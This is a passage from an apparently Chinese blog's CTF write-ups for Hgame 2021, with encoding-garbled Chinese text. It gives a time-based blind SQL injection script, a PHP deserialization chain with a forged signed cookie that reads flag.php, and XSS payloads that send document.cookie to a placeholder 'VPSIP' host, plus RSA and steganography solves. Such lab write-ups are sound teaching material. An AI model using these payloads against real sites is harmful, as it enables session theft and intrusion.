\"/**/oR/**/if((seLect/**/lenGth(`usern@me`)liKe/**/{i}/**/fRom/**/u5ers/**/lImit/**/0,1),sleep(1),1)#\" # get_len(username_len) # # 5 # password_len = \"/**/oR/**/if((seLect/**/lenGth(`p@ssword`)liKe/**/{i}/**/fRom/**/u5ers/**/lImit/**/0,1),sleep(1),1)#\" # get_len(password_len) # # 24 # username = \"/**/oR/**/if((seLect/**/subStr(`usern@me`,{j},1)liKe/**/binary/**/{s}/**/fRom/**/u5ers/**/limIt/**/0,1),sleep(1),1)#\" # get_name(username, 5) # # admin password = \"/**/oR/**/if((seLect/**/subStr(`p@ssword`,{j},1)liKe/**/binary/**/{s}/**/fRom/**/u5ers/**/limIt/**/0,1),sleep(1),1)#\" get_name(password, 24) # sOme7hiNgseCretw4sHidd3n if __name__ == '__main__': main() æœ€åç™»å½•æ‹¿åˆ° flagã€‚ hgame{7imeB4se_injeCti0n+hiDe~th3^5ecRets} Arknights r4uåè¿äº†ï¼r4uæ²¡å‡ºå¤•å’Œå¹´ï¼r4uè‡ªé—­äº†ï¼r4uå†™äº†ä¸ªæŠ½å¡æ¨¡æ‹Ÿå™¨æƒ³è¦è¯æ˜è‡ªå·±ä¸æ˜¯éé…‹ï¼Œè¿™ä¸€åˆ‡éƒ½æ˜¯é¹°è§’çš„é”™ã€‚r4uç”¨gitéƒ¨ç½²åˆ°äº†è‡ªå·±çš„æœåŠ¡å™¨ä¸Šï¼Œç„¶è€Œè¿™ä¸€åˆ‡éƒ½è¢«å¤§é»‘å®¢likiçœ‹åœ¨äº†çœ¼é‡Œã€‚ flagä½äºç½‘ç«™æ ¹ç›®å½•flag.phpä¸­ http://84f327c77d.arknights.r4u.top å¥½è€¶ï¼Œæ˜¯ git æ³„éœ²ï¼ å…ˆæŠŠæºç æ‹‰ä¸‹æ¥ã€‚ index.php &lt;?php error_reporting(0); require_once (\"simulator.php\"); $simulator = new Simulator(); $cards = array(); if(isset($_POST[\"draw\"])){ $cards = $simulator-&gt;draw($_POST[\"draw\"]); } ?&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;title&gt;Arknights&lt;/title&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt; &lt;link href=\"static/css/bootstrap.min.css\" rel=\"stylesheet\"&gt; &lt;link href=\"/static/css/cover.css\" rel=\"stylesheet\"&gt; &lt;/head&gt; &lt;body class=\"text-center\"&gt; &lt;div class=\"d-flex w-100 h-100 p-3 mx-auto flex-column\"&gt; &lt;header class=\"mastfoot mt-auto\"&gt; &lt;h1&gt;éé…‹è¯æ˜å™¨&lt;/h1&gt; &lt;br&gt; &lt;br&gt; &lt;/header&gt; &lt;main style=\"height: 85%\"&gt; &lt;div class=\"card own\"&gt; &lt;h5 class=\"card-header\" style=\"color: blue\"&gt;æŠ½ä¸­çš„å…­æ˜Ÿå¹²å‘˜&lt;/h5&gt; &lt;div class=\"card-body\"&gt; &lt;?php $legendary = $simulator-&gt;getLegendary(); foreach ($legendary as $worker){ echo \"&lt;p class='legendary'&gt;\".$worker[\"type\"].\" \".$worker[\"name\"].\"&lt;/p&gt;\"; } ?&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"card col-md-3\" style=\"color: #007bff;width=100%;\"&gt; &lt;h5 class=\"card-header\"&gt;åˆ€å®¢å¡”ï¼Œä½ è¦è€å©†ä¸è¦ï¼Ÿ&lt;/h5&gt; &lt;div class=\"card-body\"&gt; &lt;?php if(!empty($cards)){ echo \"&lt;h5 class=\\\"card-title\\\"&gt;æŠ½å¡ç»“æœï¼š&lt;/h5&gt;\"; echo \"&lt;br&gt;\"; } foreach ($cards as $card){ switch ($card[\"stars\"]){ case 3: echo \"&lt;p class='normal'&gt;\".$card[\"card\"][\"star\"].\" \".$card[\"card\"][\"type\"].\" \".$card[\"card\"][\"name\"].\"&lt;/p&gt;\"; break; case 4: echo \"&lt;p class='rare'&gt;\".$card[\"card\"][\"star\"].\" \".$card[\"card\"][\"type\"].\" \".$card[\"card\"][\"name\"].\"&lt;/p&gt;\"; break; case 5: echo \"&lt;p class='epic'&gt;\".$card[\"card\"][\"star\"].\" \".$card[\"card\"][\"type\"].\" \".$card[\"card\"][\"name\"].\"&lt;/p&gt;\"; break; case 6: echo \"&lt;p class='legendary'&gt;\".$card[\"card\"][\"star\"].\" \".$card[\"card\"][\"type\"].\" \".$card[\"card\"][\"name\"].\"&lt;/p&gt;\"; break; } } ?&gt; &lt;br&gt; &lt;hr&gt; &lt;form method=\"POST\" action=\"\"&gt; &lt;button class=\"btn btn-primary\" name=\"draw\" value=\"1\"&gt;æŠ½ä¸€æ¬¡&lt;/button&gt; &lt;button class=\"btn btn-primary\" name=\"draw\" value=\"10\"&gt;è¿è¿è¿è¿è¿è¿è¿è¿è¿è¿!&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/main&gt; &lt;footer class=\"mastfoot mt-auto\"&gt; &lt;p&gt;Made by 109å‘æŠ½ä¸åˆ°&lt;del&gt;è€å©†&lt;/del&gt;å¤•çš„&lt;b&gt;R4u&lt;/b&gt;.&lt;/p&gt; &lt;/footer&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; simulator.php &lt;?php class Simulator{ public $session; public $cardsPool; public function __construct(){ $this-&gt;session = new Session(); if(array_key_exists(\"session\", $_COOKIE)){ $this-&gt;session-&gt;extract($_COOKIE[\"session\"]); } $this-&gt;cardsPool = new CardsPool(\"./pool.php\"); $this-&gt;cardsPool-&gt;init(); } public function draw($count){ $result = array(); for($i=0; $i&lt;$count; $i++){ $card = $this-&gt;cardsPool-&gt;draw(); if($card[\"stars\"] == 6){ $this-&gt;session-&gt;set('', $card[\"No\"]); } $result[] = $card; } $this-&gt;session-&gt;save(); return $result; } public function getLegendary(){ $six = array(); $data = $this-&gt;session-&gt;getAll(); foreach ($data as $item) { $six[] = $this-&gt;cardsPool-&gt;cards[6][$item]; } return $six; } } class CardsPool { public $cards; private $file; public function __construct($filePath) { if (file_exists($filePath)) { $this-&gt;file = $filePath; } else { die(\"Cards pool file doesn't exist!\"); } } public function draw() { $rand = mt_rand(1, 100); $level = 0; if ($rand &gt;= 1 &amp;&amp; $rand &lt;= 42) { $level = 3; } elseif ($rand &gt;= 43 &amp;&amp; $rand &lt;= 90) { $level = 4; } elseif ($rand &gt;= 91 &amp;&amp; $rand &lt;= 99) { $level = 5; } elseif ($rand == 100) { $level = 6; } $rand_key = array_rand($this-&gt;cards[$level]); return array( \"stars\" =&gt; $level, \"No\" =&gt; $rand_key, \"card\" =&gt; $this-&gt;cards[$level][$rand_key] ); } public function init() { $this-&gt;cards = include($this-&gt;file); } public function __toString(){ return file_get_contents($this-&gt;file); } } class Session{ private $sessionData; const SECRET_KEY = \"7tH1PKviC9ncELTA1fPysf6NYq7z7IA9\"; public function __construct(){} public function set($key, $value){ if(empty($key)){ $this-&gt;sessionData[] = $value; }else{ $this-&gt;sessionData[$key] = $value; } } public function getAll(){ return $this-&gt;sessionData; } public function save(){ $serialized = serialize($this-&gt;sessionData); $sign = base64_encode(md5($serialized . self::SECRET_KEY)); $value = base64_encode($serialized) . \".\" . $sign; setcookie(\"session\",$value); } public function extract($session){ $sess_array = explode(\".\", $session); $data = base64_decode($sess_array[0]); $sign = base64_decode($sess_array[1]); if($sign === md5($data . self::SECRET_KEY)){ $this-&gt;sessionData = unserialize($data); }else{ unset($this-&gt;sessionData); die(\"Go away! You hacker!\"); } } } class Eeeeeeevallllllll{ public $msg=\"åålikiåˆ°æ­¤ä¸€æ¸¸\"; public function __destruct() { echo $this-&gt;msg; } } pool.php é‡Œæ˜¯ä¸€å †é»˜è®¤æ¸¸æˆé…ç½® &lt;?php return array( 3 =&gt; array(//%42 array(\"star\" =&gt; \"â˜…â˜…â˜…\", \"name\" =&gt; \"kokodayo~\", \"type\" =&gt; \"ç‹™å‡»\"), array(\"star\" =&gt; \"â˜…â˜…â˜…\", \"name\" =&gt; \"æ³¡æ™®å¡\", \"type\" =&gt; \"è¿‘å«\"), array(\"star\" =&gt; \"â˜…â˜…â˜…\", \"name\" =&gt; \"ç‚ç†”\", \"type\" =&gt; \"æœ¯å£«\"), array(\"star\" =&gt; \"â˜…â˜…â˜…\", \"name\" =&gt; \"æ–‘ç‚¹\", \"type\" =&gt; \"é‡è£…\"), array(\"star\" =&gt; \"â˜…â˜…â˜…\", \"name\" =&gt; \"é¦™è‰\", \"type\" =&gt; \"å…ˆé”‹\"), array(\"star\" =&gt; \"â˜…â˜…â˜…\", \"name\" =&gt; \"ç²‰æ¯›çŒ›ç”·\", \"type\" =&gt; \"åŒ»ç–—\"), array(\"star\" =&gt; \"â˜…â˜…â˜…\", \"name\" =&gt; \"ç¿ç¾½\", \"type\" =&gt; \"å…ˆé”‹\"), array(\"star\" =&gt; \"â˜…â˜…â˜…\", \"name\" =&gt; \"æ³¡æ™®å¡\", \"type\" =&gt; \"è¿‘å«\"), array(\"star\" =&gt; \"â˜…â˜…â˜…\", \"name\" =&gt; \"å¡ç¼‡\", \"type\" =&gt; \"é‡è£…\"), array(\"star\" =&gt; \"â˜…â˜…â˜…\", \"name\" =&gt; \"ç±³æ ¼é²\", \"type\" =&gt; \"é‡è£…\"), array(\"star\" =&gt; \"â˜…â˜…â˜…\", \"name\" =&gt; \"å®‰å¾·åˆ‡å°”\", \"type\" =&gt; \"ç‹™å‡»\"), array(\"star\" =&gt; \"â˜…â˜…â˜…\", \"name\" =&gt; \"èŠ™è“‰\", \"type\" =&gt; \"åŒ»ç–—\"), array(\"star\" =&gt; \"â˜…â˜…â˜…\", \"name\" =&gt; \"æ¢“å…°\", \"type\" =&gt; \"ç‰¹ç§\") ), //...... ); å…³é”®çš„æºç åœ¨ simulator.php é‡Œï¼Œå¯ä»¥çœ‹åˆ°æœ‰ __construct() __toString() file_get_contents ååºåˆ—åŒ–æ¼æ´ é‚£å°±æ„é€ åˆ©ç”¨é“¾å¥½äº†ã€‚ æ³¨æ„åˆ° Eeeeeeevallllllll ç±»é‡Œæœ‰ echoï¼Œè®©è¿™ä¸ª msg æŒ‡å‘ CardsPool('flag.php') å¯¹è±¡ï¼Œå°±èƒ½åœ¨Eeeeeeevallllllll å®ä¾‹åŒ–çš„å¯¹è±¡é”€æ¯çš„æ—¶å€™è°ƒç”¨ CardsPool å¯¹è±¡çš„ __toString()ï¼Œé€šè¿‡ file_get_contents æ¥è¯»å– flag æ–‡ä»¶äº†ã€‚ Exp: ç›´æ¥åœ¨ simulator æ–‡ä»¶ç»“å°¾åŠ ä¸Šè¿™å‡ æ¡è¯­å¥ã€‚ $xx = new Eeeeeeevallllllll(); $xx-&gt;msg = new CardsPool('flag.php'); echo \"&lt;br&gt;\"; $yy = serialize($xx); echo $yy; echo \"&lt;br&gt;\"; $sign = base64_encode(md5($yy . \"7tH1PKviC9ncELTA1fPysf6NYq7z7IA9\")); $value = base64_encode($yy) . \".\" . $sign; echo $value; å¾—åˆ°åºåˆ—åŒ–çš„å­—ç¬¦ä¸² ä»¥åŠ åŠ å¯†çš„å­—ç¬¦ä¸² O:17:\"Eeeeeeevallllllll\":1:{s:3:\"msg\";O:9:\"CardsPool\":2:{s:5:\"cards\";N;s:15:\"CardsPoolfile\";s:8:\"flag.php\";}} TzoxNzoiRWVlZWVlZXZhbGxsbGxsbGwiOjE6e3M6MzoibXNnIjtPOjk6IkNhcmRzUG9vbCI6Mjp7czo1OiJjYXJkcyI7TjtzOjE1OiIAQ2FyZHNQb29sAGZpbGUiO3M6ODoiZmxhZy5waHAiO319.Y2Q1NjAzYWE3MjAxOWEwM2NjOWEwY2ZkNzk0ZmEwNzQ= æ”¹ cookies å†è®¿é—®å³å¯æ‹¿åˆ° flagã€‚ Post to zuckonit2.0 d1gg12 çš„åšå®¢è¢«æ—¥ç©¿ä»¥åï¼Œä»–æƒ³åŠæ³•å­¦äº†æ›´æ·±å…¥çš„ XSS é˜²æŠ¤æ–¹æ³•ï¼Œ ç°åœ¨è¿™ä¸ªåšå®¢çœ‹ä¸Šå»å·²ç»åšä¸å¯æ‘§äº†â€¦æ˜¯è¿™æ ·å—ï¼Ÿ http://zuckonit-2.0727.site:5000/ è¿˜æ˜¯ XSSã€‚ ç»™äº†æºç åœ¨ /static/www.zip app.py @app.route('/') def home(): response = make_response(render_template(\"index.html\")) response.headers['Set-Cookie'] = \"token=WELCOME TO HGAME 2021.;\" response.headers['Content-Security-Policy'] = \"default-src 'self'; script-src 'self';\" return response @app.route('/preview') def preview(): if session.get('substr') and session.get('replacement'): substr = session['substr'] replacement = session['replacement'] else: substr = \"\" replacement = \"\" response = make_response( render_template(\"preview.html\", substr=substr, replacement=replacement)) return response @app.route('/send', methods=['POST']) def send(): if request.form.get('content'): content = escape_index(request.form['content']) if session.get('contents'): content_list = session['contents'] content_list.append(content) else: content_list = [content] session['contents'] = content_list return \"post has been sent.\" else: return \"WELCOME TO HGAME 2021 :)\" @app.route('/replace', methods=[\"POST\"]) def replace(): if request.form.get('substr') and request.form.get('replacement'): session['substr'] = escape_replace(request.form['substr']) session['replacement'] = escape_replace(request.form['replacement']) return \"replace success\" else: return \"There is no content to replace any more\" @app.route('/contents', methods=[\"GET\"]) def get_contents(): if session.get('contents'): content_list = jsonify(session['contents']) else: content_list = jsonify('&lt;i&gt;2021-02-12&lt;/i&gt;&lt;p&gt;Happy New Year every guys! ' 'Maybe it is nearly done now.&lt;/p&gt;', '&lt;i&gt;2021-02-11&lt;/i&gt;&lt;p&gt;Busy preparing for the Chinese New Year... ' 'And I add some new features to this editor, maybe you can take a try. ' 'But it has not done yet, I\\'m not sure if it can be safe from attacks.&lt;/p&gt;', '&lt;i&gt;2021-02-07&lt;/i&gt;&lt;p&gt;so many hackers here, I am going to add some strict rules.&lt;/p&gt;', '&lt;i&gt;2021-02-06&lt;/i&gt;&lt;p&gt;I have tried to learn HTML the whole yesterday, ' 'and I finally made this ONLINE BLOG EDITOR. Feel free to write down your thoughts.&lt;/p&gt;', '&lt;i&gt;2021-02-05&lt;/i&gt;&lt;p&gt;Yesterday, I watched &lt;i&gt;The Social Network&lt;/i&gt;. ' 'It really astonished me. Something flashed me.&lt;/p&gt;') return content_list @app.route('/code', methods=[\"GET\"]) def get_code(): if session.get('code'): return Response(response=json.dumps({'code': session['code']}), status=200, mimetype='application/json') else: code = create_code() session['code'] = code return Response(response=json.dumps({'code': code}), status=200, mimetype='application/json') @app.route('/flag') def show_flag(): if request.cookies.get('token') == \"29342ru89j3thisisfakecookieq983h23ijfq2ojifrnq92h2\": return \"hgame{G3t_fl@g_s0_Easy?No_way!!wryyyyyyyyy}\" else: return \"Only admin can get the flag, your token shows that you're not admin!\" @app.route('/clear') def clear_session(): session['contents'] = [] return \"ALL contents are cleared.\" def escape_index(original): content = original content_iframe = re.sub(r\"^(&lt;?/?iframe)\\s+.*?(src=[\\\"'][a-zA-Z/]{1,8}[\\\"']).*?(&gt;?)$\", r\"\\1 \\2 \\3\", content) if content_iframe != content or re.match(r\"^(&lt;?/?iframe)\\s+(src=[\\\"'][a-zA-Z/]{1,8}[\\\"'])$\", content): return content_iframe else: content = re.sub(r\"&lt;*/?(.*?)&gt;?\", r\"\\1\", content) return content def escape_replace(original): content = original content = re.sub(\"[&lt;&gt;]\", \"\", content) return content def create_code(): hashobj = hashlib.md5() hashobj.update(bytes(str(time.time()), encoding='utf-8')) code_hash = hashobj.hexdigest()[:6] return code_hash ä¸»é¡µ / åŠ äº† Content-Security-Policyï¼Œ/preview é¡µé¢æ²¡æœ‰ã€‚ templates/preview.html &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;link href=\"{{ url_for('static',filename='css/common.css') }}\" rel=\"stylesheet\" type=\"text/css\"&gt; &lt;title&gt;ONLINE BLOG EDITOR&lt;/title&gt; &lt;script src=\"{{ url_for('static',filename='js/jquery-3.5.1.min.js') }}\"&gt;&lt;/script&gt; &lt;script&gt; $(function () { $.get(\"/contents\").done(function (data) { let substr = \"{{ substr }}\" let replacement = \"{{ replacement | safe }}\" let output = document.getElementById(\"output\") for (let i = 0; i &lt; data.length; i++) { let div = document.createElement(\"div\") div.innerHTML = data[i].replace(substr, replacement) output.appendChild(div) } }) }) &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"header\"&gt; &lt;a href=\"#\"&gt;Online Blog Editor&lt;/a&gt; &lt;/div&gt; &lt;div id=\"navigation\"&gt; &lt;ol&gt; &lt;li&gt;&lt;a href=\"#\"&gt;Editor&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"/flag\"&gt;Flag&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#\"&gt;About&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#\"&gt;Help&lt;/a&gt;&lt;/li&gt; &lt;/ol&gt; &lt;/div&gt; &lt;div id=\"main\"&gt; &lt;h1 id=\"title\"&gt;Post to Zuckonit&lt;/h1&gt; &lt;div id=\"main-content\"&gt; &lt;div id=\"output\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; æ¨¡æ¿é‡Œçš„ let substr = \"{{ substr }}\" æ˜¯å°†ç‰¹æ®Šå­—ç¬¦å¦‚ å¼•å· \" ã€&lt;&gt; è½¬ä¹‰äº†çš„ã€‚ è€Œ let replacement = \"{{ replacement | safe }}\" å‡ºæ¥æ˜¯ä¿ç•™åŸå‹çš„ã€‚ äºæ˜¯è¿™é‡Œå°±æœ‰æ¼æ´ã€‚ å°±æ„é€ ä¸€ä¸ª payload æŠŠå¼•å·é—­åˆï¼Œç„¶åå¸¦ç€ cookie æ‰“åˆ° VPS ä¸Šã€‚ meow\"+$.get(\"http://VPSIP/\"+document.cookie);// post çš„å†…å®¹çš„è¯å°±æ”¾ä¸ªæŒ‡å‘ preview çš„ iframeã€‚ &lt;iframe src=\"preview\"&gt;&lt;/iframe&gt; åç«¯æ›¿æ¢åè¿”å› &lt;iframe src=\"preview\" &gt; è¿˜æ˜¯æœ‰æ•ˆçš„ã€‚ ç„¶åç®—ä¸ª md5 æäº¤ã€‚ token=568fda45ba279640fc974e68b592366d82e1b74dfbc18c92ba4df52e6870e7c2 æœ€åæ”¹ cookieï¼Œæ‹¿ flag. hgame{simple_csp_bypass&amp;a_small_mistake_on_the_replace_function} è¿™å½“ç„¶æ˜¯éé¢„æœŸè§£å•¦ 2333. Post to zuckonit another version d1gg12 çš„åšå®¢è¢«æ—¥ç©¿ä»¥åï¼Œä»–æƒ³åŠæ³•å­¦äº†æ›´æ·±å…¥çš„ XSS é˜²æŠ¤æ–¹æ³•ï¼Œ ç°åœ¨è¿™ä¸ªåšå®¢çœ‹ä¸Šå»å·²ç»åšä¸å¯æ‘§äº†â€¦æ˜¯è¿™æ ·å—ï¼Ÿ hint1: æŸ¥çœ‹ç½‘é¡µæºä»£ç  hint2: å…³äºâ€œæ›´æ·±å…¥çš„xssé˜²æŠ¤æ–¹æ³•â€ï¼š çœ‹çœ‹è¿”å›å¤´ï¼Ÿ hint3: RegExp hint4: https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace http://zuckonit-2-another.0727.site:5050/ ï¼ˆæ¥å¤ç°ä¸€ä¸‹ï¼‰ app.py @app.route('/') def home(): response = make_response(render_template(\"index.html\")) response.headers['Set-Cookie'] = \"token=WELCOME TO HGAME 2021.;\" response.headers['Content-Security-Policy'] = \"default-src 'self'; script-src 'self';\" return response @app.route('/preview') def preview(): if session.get('substr'): substr = session['substr'] else: substr = \"\" response = make_response( render_template(\"preview.html\", substr=substr)) return response @app.route('/send', methods=['POST']) def send(): if request.form.get('content'): content = escape_index(request.form['content']) if session.get('contents'): content_list = session['contents'] content_list.append(content) else: content_list = [content] session['contents'] = content_list return \"post has been sent.\" else: return \"WELCOME TO HGAME 2021 :)\" @app.route('/search', methods=[\"POST\"]) def replace(): if request.form.get('substr'): session['substr'] = escape_replace(request.form['substr']) return \"replace success\" else: return \"There is no content to search any more\" @app.route('/contents', methods=[\"GET\"]) def get_contents(): if session.get('contents'): content_list = jsonify(session['contents']) else: content_list = jsonify('&lt;i&gt;2021-02-12&lt;/i&gt;&lt;p&gt;Happy New Year every guys! ' 'Maybe it is nearly done now.&lt;/p&gt;', '&lt;i&gt;2021-02-11&lt;/i&gt;&lt;p&gt;Busy preparing for the Chinese New Year... ' 'And I add some new features to this editor, maybe you can take a try. ' 'But it has not done yet, I\\'m not sure if it can be safe from attacks.&lt;/p&gt;', '&lt;i&gt;2021-02-07&lt;/i&gt;&lt;p&gt;so many hackers here, I am going to add some strict rules.&lt;/p&gt;', '&lt;i&gt;2021-02-06&lt;/i&gt;&lt;p&gt;I have tried to learn HTML the whole yesterday, ' 'and I finally made this ONLINE BLOG EDITOR. Feel free to write down your thoughts.&lt;/p&gt;', '&lt;i&gt;2021-02-05&lt;/i&gt;&lt;p&gt;Yesterday, I watched &lt;i&gt;The Social Network&lt;/i&gt;. ' 'It really astonished me. Something flashed me.&lt;/p&gt;') return content_list @app.route('/code', methods=[\"GET\"]) def get_code(): if session.get('code'): return Response(response=json.dumps({'code': session['code']}), status=200, mimetype='application/json') else: code = create_code() session['code'] = code return Response(response=json.dumps({'code': code}), status=200, mimetype='application/json') @app.route('/flag') def show_flag(): if request.cookies.get('token') == \"29342ru89j3thisisfakecookieq983h23ijfq2ojifrnq92h2\": return \"hgame{G3t_fl@g_s0_Easy?No_way!!wryyyyyyyyy}\" else: return \"Only admin can get the flag, your token shows that you're not admin!\" @app.route('/clear') def clear_session(): session['contents'] = [] return \"ALL contents are cleared.\" def escape_index(original): content = original content_iframe = re.sub( r\"^(&lt;?/?iframe)\\s+.*?(src=[\\\"'][a-zA-Z/]{1,8}[\\\"']).*?(&gt;?)$\", r\"\\1 \\2 \\3\", content) if content_iframe != content or re.match(r\"^(&lt;?/?iframe)\\s+(src=[\\\"'][a-zA-Z/]{1,8}[\\\"'])$\", content): return content_iframe else: content = re.sub(r\"&lt;*/?(.*?)&gt;?\", r\"\\1\", content) return content def escape_replace(original): content = original content = re.sub(r\"[&lt;&gt;\\\"\\\\]\", \"\", content) return content def create_code(): hashobj = hashlib.md5() hashobj.update(bytes(str(time.time()), encoding='utf-8')) code_hash = hashobj.hexdigest()[:6] return code_hash æ”¹äº†ä¸ª searchï¼Œè¿‡æ»¤é‡Œå¤šäº† \" \\ ä¸èƒ½åƒä¸Šä¸€é¢˜é‚£æ ·é—­åˆé‚£ä¸ª åŒå¼•å· äº†ã€‚ preview.html ä¸­çš„ js æ”¹æˆäº† $(function () { $.get(\"/contents\").done(function (data) { let content = \"{{ substr | safe }}\" let output = document.getElementById(\"output\") for (let i = 0; i &lt; data.length; i++) { let div = document.createElement(\"div\") let substr = new RegExp(content, 'g') div.innerHTML = data[i].replace(substr, `&lt;b class=\"search_result\"&gt;${content}&lt;/b&gt;`) output.appendChild(div) } }) }) å¯è§å¼„äº†ä¸ª æ­£åˆ™æ›¿æ¢ã€‚ æ ¹æ®å®˜æ–¹ WriteUpï¼Œå¯ä»¥é€šè¿‡æ„é€  {ä»»æ„åŒ¹é…çš„å­—ç¬¦ä¸²}|{æƒ³è¦æ³¨â¼Šçš„å­—ç¬¦ä¸²} è¿™æ ·çš„æ­£åˆ™è¡¨è¾¾å¼æ¥ç»™é¡µé¢æ³¨å…¥å…ƒç´ ã€‚ å†æ ¹æ® String.prototype.replace() çš„ç‰¹æ®Šå˜é‡å ä¸»é¡µè¿˜æ˜¯ post &lt;iframe src=\"preview\"&gt; äºæ˜¯å°±å¯ä»¥åˆ©ç”¨ åˆ†ç»„ ç»“åˆ $n æ¥å¾—åˆ°å°–æ‹¬å·ã€‚ å•å¼•å·è¿˜æ˜¯èƒ½ç”¨çš„ï¼Œå˜¿å˜¿ã€‚ payload: (.)iframe src=.preview.(.)|$1img src=x onerror=top.location='//VPSIP/'+document.cookie$2 ç„¶åæ‹¿åˆ° cookie token=6a506f5c3eff9ffe9dc573bc93629038f61a7fcdd7662efb441451b08b0c6671 æ‹¿åˆ° flag hgame{CSP_iS_VerY_5trlct&amp;0nly_C@n_uSe_3vil.Js!} BTW, å®˜æ–¹ç»™çš„ payload æ˜¯ åˆ©â½¤æˆ‘ä»¬ post çš„ iframe ä¸¤è¾¹çš„å°–æ‹¬å·ï¼Œé€šè¿‡ $` $' â½†ä¸­â½£æœ‰ iframe|$`input size=11 onfocus=window.open('vps-ip'+document.cookie) autofocus$' CryptoLikiPrime Wow! RSA! https://prime.liki.link/ #!/usr/bin/env python3 import random from libnum import s2n from secret import secrets, flag def get_prime(secret): prime = 1 for _ in range(secret): prime = prime &lt;&lt; 1 return prime - 1 random.shuffle(secrets) m = s2n(flag) p = get_prime(secrets[0]) q = get_prime(secrets[1]) n = p * q e = 0x10001 c = pow(m, e, n) print(\"n = {}.format(n)\") print(\"e = {}.format(e)\") print(\"c = {}.format(c)\") # n = 15361898878235696574667000105109009720717806584760935092206242960407549236363501417213696346370999607974104247856479458833772412536980365740161717369268547876567930581662460946856562030722330783421995955447378594119758550329759849393535018344139103042143621239011469955648205934903904045564846822159998174879695774419450399723970148270141003002902927002767984254099972288746243481084381643719731958360702561818663569730597624966561268824737610893516032068613120089855690580047620589196079907477458543783300282393495461746306096415443274084362956267239186823089349090398919748814938872938478097065267156231648487203329412422615711711886164634059723362167236118521458497248305115764510762731915291882155494011713295462603221439763218477455674584662524137991730891776826849188975650354165106378834014987695592746836998002232826678339919918799781246827459617082687425955430641815518416878015728514477287192934193957833532996687234554280263817068106805440848475668830505180172049674756979856286907198648267160926305328986853052888831678087029867946180609 # e = 65537 # c = 7927187628026055322783940901550651937893953660065534609714001711924456963095603013667085470146144874981960574233466397443449977149997357471575431695025415526421127927424585253533999961265066779103259623451208111709082292139347059312149137665426462381816329178229484680275368657450003046701355985014009700915439417466826446848877329284810802949440433122207430136944380576095681081740197798597559437163702511712448892986978229285577672410865991889634686024629071902793778620692548548234276678653195648305462703623579369309956481606223043040903082180559720551235515700080661234190693094571406679557502413049745325301747588707839920522910923018864009003988475371258742969932381590308381543035539043149634871622927695645953044249331889058081699783884965964986919852075768119185486506729958481688848547730131040350180411446263394686119546781350542737049112800140601734883325024073000156078427592350484379976615561586860882656403198952361411599125358422676828954908797542225611418969233985502900316342896903161811894061826308302594273209131132802270416006 p, q éƒ½æ˜¯ 2**n - 1ï¼Œæ‡’äº†ç›´æ¥å» http://factordb.com æ±‚è§£ï¼Œå¾—åˆ° p = 2 ** 1279 - 1 q = 2 ** 2203 - 1 ç„¶åç›´æ¥è§£å°±å¥½ã€‚ hgame{Mers3nne~Pr!Me^re4l1y_s0+5O-li7tle!} å°ç»“å™¢ï¼ŒMisc å¿˜è®°åšäº†å•Šï¼Œé—®é¢˜ä¸å¤§ï¼ˆï¼ˆ å–µå‘œå‘œï¼Œæˆ‘å¥½èœå•Šï¼Œé¢˜ç›®å¥½éš¾å•Šï¼ï¼ï¼ å°±è¿™æ ·å§ï¼ˆ ï¼ˆæºœäº†æºœäº†å–µ","path":"2021/02/23/CTF_2021HgameWeek3/"},{"title":"CTF | 2021 Hgame Week2 WriteUp","text":"å¼•è¨€å¼€é—¨è§å±±ï¼Œè¿™ç¯‡æ˜¯ Hgame 2021 ç¬¬äºŒå‘¨çš„ WriteUp å•¦ã€‚ ç¬¬ä¸€å‘¨çš„è¯¦è§ CTF | 2021 Hgame Week1 WriteUpã€‚ MiscTools å·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨ã€‚ https://1.oss.hgame2021.vidar.club/tools_21d9ccfca5a4321d6256038d3e885b6d.zip F5 è§£ Matryoshka.jpg $ java Extract Matryoshka.jpg -p \"!LyJJ9bi&amp;M7E72*JyD\" Huffman decoding starts Permutation starts 577536 indices shuffled Extraction starts Length of embedded file: 18 bytes (1, 127, 7) code used å¾—åˆ° e@317S*p1A4bIYIs1M è§£å‹ # A7SL9nHRJXLh@$EbE8 $ steghide.exe extract -sf \"01.jpg\" -p \"A7SL9nHRJXLh@$EbE8\" wrote extracted data to \"pwd.txt\". u0!FO4JUhl5!L55%$&amp; 02.jpg:z0GFieYAee%gdf0%lF $ outguess -k \"z0GFieYAee%gdf0%lF\" -r 02.jpg output.txt Reading 02.jpg.... Extracting usable bits: 4930 bits Steg retrieve: seed: 184, len: 18 $ cat output.txt @UjXL93044V5zl2ZKI æœ‰æ¯’ï¼Œæˆ‘ç”¨æ–°ç‰ˆ https://github.com/resurrecting-open-source-projects/outguess è¿™ä¸ªå‡ºæ¥æ˜¯ä¹±ç â€¦â€¦ è¦ç”¨æ—§ç‰ˆçš„ https://github.com/crorvick/outguessï¼Œç„¶åç¼–è¯‘å®‰è£…ã€‚ ./configure &amp;&amp; make 03.jpg: rFQmRoT5lze@4X4^@0 åˆ°è¿™é‡Œå…¶å®å°±å¯ä»¥æ‰«å‡ºæ¥äº†~ hgame{Taowa_is_N0T_g00d_but_T001s_is_Useful} ä¸è¿‡è¿˜æ˜¯åšä¸€ä¸‹å§ã€‚ xSRejK1^Z1Cp9M!z@H æœ€åæ‹¼æˆä¸€æ•´ä¸ªã€‚ DNS A significant invention. https://1.oss.hgame2021.vidar.club/dns_250e1c3c63209fd5546937be4f41cb39.pcapng ä»æŠ“åˆ°çš„æµé‡å¯ä»¥çœ‹åˆ° DNS æŸ¥è¯¢ï¼Œä»¥åŠè®¿é—®äº†ä¸€ä¸ªåŸŸåä¸º flag.hgame2021.cf 